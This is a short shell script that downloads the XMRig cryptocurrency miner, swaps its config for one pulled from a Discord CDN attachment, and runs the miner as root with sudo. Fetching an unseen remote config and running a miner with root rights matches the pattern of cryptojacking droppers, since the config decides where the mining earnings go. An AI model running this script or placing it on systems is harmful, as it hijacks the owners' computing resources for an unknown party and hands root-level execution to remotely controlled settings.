wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-focal-x64.tar.gz
tar -xf xmrig-6.15.2-focal-x64.tar.gz
cd ./xmrig-6.15.2
rm config.json
chmod +x ./xmrig
wget https://cdn.discordapp.com/attachments/819920968121319454/892277488007380992/config.json
sudo ./xmrig
